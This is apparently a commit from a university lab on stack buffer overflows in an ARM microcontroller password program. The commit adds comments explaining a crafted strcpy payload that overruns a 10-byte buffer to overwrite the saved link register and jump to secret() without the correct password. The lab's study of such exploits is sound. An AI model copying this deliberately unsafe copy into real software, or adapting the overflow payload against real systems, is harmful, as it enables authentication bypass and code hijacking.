fa831f31db42cb5b2b59b98ce9d29a180c8f54de
Roman Kulev <rk1126@york.ac.uk>
2023-11-14 06:09:56 +0000

    added comments

--- Stacks/password/Objects/main.d
+++ Stacks/password/Objects/main.d
@@ -1,4 +1,4 @@
 ./objects/main.o: src\main.c inc\Utils\utils.h \
-  c:\Keil_v5\ARM\ARMCLANG\Bin\..\include\stdint.h \
-  c:\Keil_v5\ARM\ARMCLANG\Bin\..\include\stdio.h \
-  c:\Keil_v5\ARM\ARMCLANG\Bin\..\include\string.h
+  C:\Keil_v5\ARM\ARMCLANG\Bin\..\include\stdint.h \
+  C:\Keil_v5\ARM\ARMCLANG\Bin\..\include\stdio.h \
+  C:\Keil_v5\ARM\ARMCLANG\Bin\..\include\string.h
--- Stacks/password/src/main.c
+++ Stacks/password/src/main.c
@@ -13,12 +13,20 @@ int main(void) {
 	char const *pwd_store = "password";
 	char attempt[10];
 	
-	// Try to overwrite the link register here so that secret() is run
-	// even if the password is incorrect
+	/*
+		0x080023C0 = address of secret()    0x080002D3 = address of link register
+	  0x080002D3: can be found just after PUSH and SUBS instructions are executed (main function) in the debugger memory watch window
+	  0x080023C0: found in the debugger as well
+	
+		\xFF - easy readable memory address (can't just do \xTG, because that won't exist in memory)
+		\xC0 -> \xC1 - have to account for the Thumb bit, therefore just add a bit to the byte address
+		\x00 - this is the null terminator of the string. Added this in intentionally.
+					 (without it, strcpy would add it in anyway).
+					 Also affects the address that needs changing, obviously.
+	*/
 	strcpy(attempt, "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xC1\x23\x00");
 	if (0 == strcmp(attempt, pwd_store)) {
 		secret();
 	}
 	
-	// 0x080023C0    0x080002D3
 }
